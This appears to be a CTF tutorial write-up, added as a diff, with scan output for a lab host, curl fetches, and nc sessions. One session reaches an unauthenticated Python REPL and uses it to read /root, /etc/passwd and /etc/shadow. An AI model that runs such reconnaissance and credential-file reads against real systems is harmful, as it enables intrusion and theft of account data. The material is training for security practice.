@@ -1,0 +1,375 @@
+# results rutscan
+PORT      STATE SERVICE REASON         VERSION
+80/tcp    open  http    syn-ack ttl 63 nginx 1.10.3
+|_http-server-header: nginx/1.10.3
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-title: tutorial-101.echocity-f.com
+60123/tcp open  unknown syn-ack ttl 63
+| fingerprint-strings: 
+|   GenericLines: 
+|     ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag
+|     _=/usr/bin/socat
+|     HOSTNAME=tutorial-101.echocity-f.com
+|     PWD=/var/www/html
+|     HOME=/root
+|     TMUX=/tmp/tmux-0/default,55,0
+|     DEBIAN_FRONTEND=noninteractive
+|     SHELL=/bin/bash
+|     TERM=screen
+|     TMUX_PANE=%0
+|     SHLVL=2
+|     PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+|     SOCAT_PID=8726
+|     SOCAT_PPID=58
+|     SOCAT_VERSION=1.7.3.1
+|     SOCAT_SOCKADDR=10.0.100.11
+|     SOCAT_SOCKPORT=60123
+|     SOCAT_PEERADDR=10.10.0.222
+|     SOCAT_PEERPORT=42362
+|   GetRequest: 
+|     ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag
+|     _=/usr/bin/socat
+|     HOSTNAME=tutorial-101.echocity-f.com
+|     PWD=/var/www/html
+|     HOME=/root
+|     TMUX=/tmp/tmux-0/default,55,0
+|     DEBIAN_FRONTEND=noninteractive
+|     SHELL=/bin/bash
+|     TERM=screen
+|     TMUX_PANE=%0
+|     SHLVL=2
+|     PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+|     SOCAT_PID=8728
+|     SOCAT_PPID=58
+|     SOCAT_VERSION=1.7.3.1
+|     SOCAT_SOCKADDR=10.0.100.11
+|     SOCAT_SOCKPORT=60123
+|     SOCAT_PEERADDR=10.10.0.222
+|     SOCAT_PEERPORT=42364
+|   HTTPOptions: 
+|     ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag
+|     _=/usr/bin/socat
+|     HOSTNAME=tutorial-101.echocity-f.com
+|     PWD=/var/www/html
+|     HOME=/root
+|     TMUX=/tmp/tmux-0/default,55,0
+|     DEBIAN_FRONTEND=noninteractive
+|     SHELL=/bin/bash
+|     TERM=screen
+|     TMUX_PANE=%0
+|     SHLVL=2
+|     PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+|     SOCAT_PID=8730
+|     SOCAT_PPID=58
+|     SOCAT_VERSION=1.7.3.1
+|     SOCAT_SOCKADDR=10.0.100.11
+|     SOCAT_SOCKPORT=60123
+|     SOCAT_PEERADDR=10.10.0.222
+|     SOCAT_PEERPORT=42376
+|   NULL: 
+|     ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag
+|     _=/usr/bin/socat
+|     HOSTNAME=tutorial-101.echocity-f.com
+|     PWD=/var/www/html
+|     HOME=/root
+|     TMUX=/tmp/tmux-0/default,55,0
+|     DEBIAN_FRONTEND=noninteractive
+|     SHELL=/bin/bash
+|     TERM=screen
+|     TMUX_PANE=%0
+|     SHLVL=2
+|     PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+|     SOCAT_PID=8722
+|     SOCAT_PPID=58
+|     SOCAT_VERSION=1.7.3.1
+|     SOCAT_SOCKADDR=10.0.100.11
+|     SOCAT_SOCKPORT=60123
+|     SOCAT_PEERADDR=10.10.0.222
+|     SOCAT_PEERPORT=42350
+|   RTSPRequest: 
+|     ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag
+|     _=/usr/bin/socat
+|     HOSTNAME=tutorial-101.echocity-f.com
+|     PWD=/var/www/html
+|     HOME=/root
+|     TMUX=/tmp/tmux-0/default,55,0
+|     DEBIAN_FRONTEND=noninteractive
+|     SHELL=/bin/bash
+|     TERM=screen
+|     TMUX_PANE=%0
+|     SHLVL=2
+|     PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+|     SOCAT_PID=8732
+|     SOCAT_PPID=58
+|     SOCAT_VERSION=1.7.3.1
+|     SOCAT_SOCKADDR=10.0.100.11
+|     SOCAT_SOCKPORT=60123
+|     SOCAT_PEERADDR=10.10.0.222
+|_    SOCAT_PEERPORT=42380
+60321/tcp open  unknown syn-ack ttl 63
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     Python 2.7.13 (default, Sep 26 2018, 18:42:22) 
+|     [GCC 6.3.0 20170516] on linux2
+|     Type "help", "copyright", "credits" or "license" for more information.
+|   GetRequest: 
+|     GET / HTTP/1.0
+|     Python 2.7.13 (default, Sep 26 2018, 18:42:22) 
+|     [GCC 6.3.0 20170516] on linux2
+|     Type "help", "copyright", "credits" or "license" for more information.
+|     HTTP/1.0
+|     Traceback (most recent call last):
+|     File "<stdin>", line 1, in <module>
+|     NameError: name 'GET' is not defined
+|   HTTPOptions: 
+|     OPTIONS / HTTP/1.0
+|     Python 2.7.13 (default, Sep 26 2018, 18:42:22) 
+|     [GCC 6.3.0 20170516] on linux2
+|     Type "help", "copyright", "credits" or "license" for more information.
+|     OPTIONS / HTTP/1.0
+|     Traceback (most recent call last):
+|     File "<stdin>", line 1, in <module>
+|     NameError: name 'OPTIONS' is not defined
+|   RTSPRequest: 
+|     OPTIONS / RTSP/1.0
+|     Python 2.7.13 (default, Sep 26 2018, 18:42:22) 
+|     [GCC 6.3.0 20170516] on linux2
+|     Type "help", "copyright", "credits" or "license" for more information.
+|     OPTIONS / RTSP/1.0
+|     Traceback (most recent call last):
+|     File "<stdin>", line 1, in <module>
+|_    NameError: name 'OPTIONS' is not defined
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port60123-TCP:V=7.93%I=7%D=2/5%Time=63DFBBBB%P=x86_64-redhat-linux-gnu%
+SF:r(NULL,1C2,"ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag\n_=/usr/bin/soc
+SF:at\nHOSTNAME=tutorial-101\.echocity-f\.com\nPWD=/var/www/html\nHOME=/ro
+SF:ot\nTMUX=/tmp/tmux-0/default,55,0\nDEBIAN_FRONTEND=noninteractive\nSHEL
+SF:L=/bin/bash\nTERM=screen\nTMUX_PANE=%0\nSHLVL=2\nPATH=/usr/local/sbin:/
+SF:usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nSOCAT_PID=8722\nSOCAT_PPID
+SF:=58\nSOCAT_VERSION=1\.7\.3\.1\nSOCAT_SOCKADDR=10\.0\.100\.11\nSOCAT_SOC
+SF:KPORT=60123\nSOCAT_PEERADDR=10\.10\.0\.222\nSOCAT_PEERPORT=42350\n")%r(
+SF:GenericLines,1C2,"ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag\n_=/usr/b
+SF:in/socat\nHOSTNAME=tutorial-101\.echocity-f\.com\nPWD=/var/www/html\nHO
+SF:ME=/root\nTMUX=/tmp/tmux-0/default,55,0\nDEBIAN_FRONTEND=noninteractive
+SF:\nSHELL=/bin/bash\nTERM=screen\nTMUX_PANE=%0\nSHLVL=2\nPATH=/usr/local/
+SF:sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nSOCAT_PID=8726\nSOCA
+SF:T_PPID=58\nSOCAT_VERSION=1\.7\.3\.1\nSOCAT_SOCKADDR=10\.0\.100\.11\nSOC
+SF:AT_SOCKPORT=60123\nSOCAT_PEERADDR=10\.10\.0\.222\nSOCAT_PEERPORT=42362\
+SF:n")%r(GetRequest,1C2,"ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag\n_=/u
+SF:sr/bin/socat\nHOSTNAME=tutorial-101\.echocity-f\.com\nPWD=/var/www/html
+SF:\nHOME=/root\nTMUX=/tmp/tmux-0/default,55,0\nDEBIAN_FRONTEND=noninterac
+SF:tive\nSHELL=/bin/bash\nTERM=screen\nTMUX_PANE=%0\nSHLVL=2\nPATH=/usr/lo
+SF:cal/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nSOCAT_PID=8728\n
+SF:SOCAT_PPID=58\nSOCAT_VERSION=1\.7\.3\.1\nSOCAT_SOCKADDR=10\.0\.100\.11\
+SF:nSOCAT_SOCKPORT=60123\nSOCAT_PEERADDR=10\.10\.0\.222\nSOCAT_PEERPORT=42
+SF:364\n")%r(HTTPOptions,1C2,"ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag\
+SF:n_=/usr/bin/socat\nHOSTNAME=tutorial-101\.echocity-f\.com\nPWD=/var/www
+SF:/html\nHOME=/root\nTMUX=/tmp/tmux-0/default,55,0\nDEBIAN_FRONTEND=nonin
+SF:teractive\nSHELL=/bin/bash\nTERM=screen\nTMUX_PANE=%0\nSHLVL=2\nPATH=/u
+SF:sr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nSOCAT_PID=8
+SF:730\nSOCAT_PPID=58\nSOCAT_VERSION=1\.7\.3\.1\nSOCAT_SOCKADDR=10\.0\.100
+SF:\.11\nSOCAT_SOCKPORT=60123\nSOCAT_PEERADDR=10\.10\.0\.222\nSOCAT_PEERPO
+SF:RT=42376\n")%r(RTSPRequest,1C2,"ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-
+SF:flag\n_=/usr/bin/socat\nHOSTNAME=tutorial-101\.echocity-f\.com\nPWD=/va
+SF:r/www/html\nHOME=/root\nTMUX=/tmp/tmux-0/default,55,0\nDEBIAN_FRONTEND=
+SF:noninteractive\nSHELL=/bin/bash\nTERM=screen\nTMUX_PANE=%0\nSHLVL=2\nPA
+SF:TH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nSOCAT_
+SF:PID=8732\nSOCAT_PPID=58\nSOCAT_VERSION=1\.7\.3\.1\nSOCAT_SOCKADDR=10\.0
+SF:\.100\.11\nSOCAT_SOCKPORT=60123\nSOCAT_PEERADDR=10\.10\.0\.222\nSOCAT_P
+SF:EERPORT=42380\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port60321-TCP:V=7.93%I=7%D=2/5%Time=63DFBBC0%P=x86_64-redhat-linux-gnu%
+SF:r(NULL,9D,"Python\x202\.7\.13\x20\(default,\x20Sep\x2026\x202018,\x2018
+SF::42:22\)\x20\r\n\[GCC\x206\.3\.0\x2020170516\]\x20on\x20linux2\r\nType\
+SF:x20\"help\",\x20\"copyright\",\x20\"credits\"\x20or\x20\"license\"\x20f
+SF:or\x20more\x20information\.\r\n>>>\x20")%r(GenericLines,B5,"Python\x202
+SF:\.7\.13\x20\(default,\x20Sep\x2026\x202018,\x2018:42:22\)\x20\r\n\[GCC\
+SF:x206\.3\.0\x2020170516\]\x20on\x20linux2\r\nType\x20\"help\",\x20\"copy
+SF:right\",\x20\"credits\"\x20or\x20\"license\"\x20for\x20more\x20informat
+SF:ion\.\r\n>>>\x20\r\n>>>\x20\r\n>>>\x20\r\n>>>\x20\r\n>>>\x20")%r(GetReq
+SF:uest,14A,"GET\x20/\x20HTTP/1\.0\r\n\r\n\r\n\r\nPython\x202\.7\.13\x20\(
+SF:default,\x20Sep\x2026\x202018,\x2018:42:22\)\x20\r\n\[GCC\x206\.3\.0\x2
+SF:020170516\]\x20on\x20linux2\r\nType\x20\"help\",\x20\"copyright\",\x20\
+SF:"credits\"\x20or\x20\"license\"\x20for\x20more\x20information\.\r\n>>>\
+SF:x20GET\x20/\x20HTTP/1\.0\r\nTraceback\x20\(most\x20recent\x20call\x20la
+SF:st\):\r\n\x20\x20File\x20\"<stdin>\",\x20line\x201,\x20in\x20<module>\r
+SF:\nNameError:\x20name\x20'GET'\x20is\x20not\x20defined\r\n>>>\x20\r\n>>>
+SF:\x20\r\n>>>\x20\r\n>>>\x20")%r(HTTPOptions,156,"OPTIONS\x20/\x20HTTP/1\
+SF:.0\r\n\r\n\r\n\r\nPython\x202\.7\.13\x20\(default,\x20Sep\x2026\x202018
+SF:,\x2018:42:22\)\x20\r\n\[GCC\x206\.3\.0\x2020170516\]\x20on\x20linux2\r
+SF:\nType\x20\"help\",\x20\"copyright\",\x20\"credits\"\x20or\x20\"license
+SF:\"\x20for\x20more\x20information\.\r\n>>>\x20OPTIONS\x20/\x20HTTP/1\.0\
+SF:r\nTraceback\x20\(most\x20recent\x20call\x20last\):\r\n\x20\x20File\x20
+SF:\"<stdin>\",\x20line\x201,\x20in\x20<module>\r\nNameError:\x20name\x20'
+SF:OPTIONS'\x20is\x20not\x20defined\r\n>>>\x20\r\n>>>\x20\r\n>>>\x20\r\n>>
+SF:>\x20")%r(RTSPRequest,156,"OPTIONS\x20/\x20RTSP/1\.0\r\n\r\n\r\n\r\nPyt
+SF:hon\x202\.7\.13\x20\(default,\x20Sep\x2026\x202018,\x2018:42:22\)\x20\r
+SF:\n\[GCC\x206\.3\.0\x2020170516\]\x20on\x20linux2\r\nType\x20\"help\",\x
+SF:20\"copyright\",\x20\"credits\"\x20or\x20\"license\"\x20for\x20more\x20
+SF:information\.\r\n>>>\x20OPTIONS\x20/\x20RTSP/1\.0\r\nTraceback\x20\(mos
+SF:t\x20recent\x20call\x20last\):\r\n\x20\x20File\x20\"<stdin>\",\x20line\
+SF:x201,\x20in\x20<module>\r\nNameError:\x20name\x20'OPTIONS'\x20is\x20not
+SF:\x20defined\r\n>>>\x20\r\n>>>\x20\r\n>>>\x20\r\n>>>\x20");
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: Linux 5.3 - 5.4 (89%), Linux 4.15 - 5.6 (88%), Linux 5.0 (88%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 5.0 - 5.3 (87%), Linux 5.4 (87%), Linux 3.10 - 4.11 (87%), Linux 3.2 - 4.9 (87%), Oracle VM Server 3.4.2 (Linux 4.1) (86%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.93%E=4%D=2/5%OT=80%CT=%CU=41566%PV=Y%DS=1%DC=T%G=N%TM=63DFBC65%P=x86_64-redhat-linux-gnu)
+SEQ(SP=104%GCD=2%ISR=106%TI=Z%CI=RI%II=I%TS=A)
+OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
+WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
+ECN(R=Y%DF=N%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)
+T1(R=Y%DF=N%T=40%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=Y%DF=Y%T=41%W=0%S=A%A=S%F=AR%O=%RD=0%Q=)
+T5(R=Y%DF=N%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=Y%DF=Y%T=41%W=0%S=A%A=S%F=AR%O=%RD=0%Q=)
+U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
+IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 44.899 days (since Thu Dec 22 10:50:43 2022)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   160.01 ms 10.0.100.11
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 08:25
+Completed NSE at 08:25, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 08:25
+Completed NSE at 08:25, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 08:25
+Completed NSE at 08:25, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 172.64 seconds
+           Raw packets sent: 67 (4.600KB) | Rcvd: 42 (3.096KB)
+
+-------------------------------------------------------------
+
+curl http://10.0.100.11:80/ 
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta name="language" content="en" />
+	<meta name="robots" content="noindex" />
+	<meta name="robots" content="nofollow" />
+	<title>tutorial-101.echocity-f.com</title>
+</head>
+<body>
+Hello there!
+</body>
+<!-- ETSCTF_beefdead -->
+</html>
+
+--------------------------------------------------------
+
+curl http://10.0.100.11/index.html
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+	<meta name="language" content="en" />
+	<meta name="robots" content="noindex" />
+	<meta name="robots" content="nofollow" />
+	<title>tutorial-101.echocity-f.com</title>
+</head>
+<body>
+Hello there!
+</body>
+<!-- ETSCTF_beefdead -->
+</html>
+
+----------------------------------------------------------------
+
+nc 10.0.100.11 60123
+
+ETSCTF_FLAG=ETSCTF_h0h0h0-found-an-env-flag
+_=/usr/bin/socat
+HOSTNAME=tutorial-101.echocity-f.com
+PWD=/var/www/html
+HOME=/root
+TMUX=/tmp/tmux-0/default,55,0
+DEBIAN_FRONTEND=noninteractive
+SHELL=/bin/bash
+TERM=screen
+TMUX_PANE=%0
+SHLVL=2
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+SOCAT_PID=30896
+SOCAT_PPID=58
+SOCAT_VERSION=1.7.3.1
+SOCAT_SOCKADDR=10.0.100.11
+SOCAT_SOCKPORT=60123
+SOCAT_PEERADDR=10.10.0.222
+SOCAT_PEERPORT=47324
+
+------------------------------------------------------------------------------------
+
+## $ nc 10.0.100.11 60321
+
+## leads to a python2.7 repl interactive shell
+print open("/root/ETSCTF", "r").read()
+ETSCTF_r00tfl4g
+
+---------------------------------------------------------------
+print open("/etc/passwd", "r").read()
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/bin/false
+ETSCTF:x:1000:65534:ETSCTF_HEY_A_PASSWD_FLAG:/home/ETSCTF:/bin/bash
+
+
+
+----------------------------------------------------------------------------
+print open("/etc/shadow", "r").read()
+
+print open("/etc/shadow", "r").read()
+root:*:18149:0:99999:7:::
+daemon:*:18149:0:99999:7:::
+bin:*:18149:0:99999:7:::
+sys:*:18149:0:99999:7:::
+sync:*:18149:0:99999:7:::
+games:*:18149:0:99999:7:::
+man:*:18149:0:99999:7:::
+lp:*:18149:0:99999:7:::
+mail:*:18149:0:99999:7:::
+news:*:18149:0:99999:7:::
+uucp:*:18149:0:99999:7:::
+proxy:*:18149:0:99999:7:::
+www-data:*:18149:0:99999:7:::
+backup:*:18149:0:99999:7:::
+list:*:18149:0:99999:7:::
+irc:*:18149:0:99999:7:::
+gnats:*:18149:0:99999:7:::
+nobody:*:18149:0:99999:7:::
+_apt:*:18149:0:99999:7:::
+ETSCTF:ETSCTF_HEY_A_SHADOW_FLAG:18211:0:99999:7:::
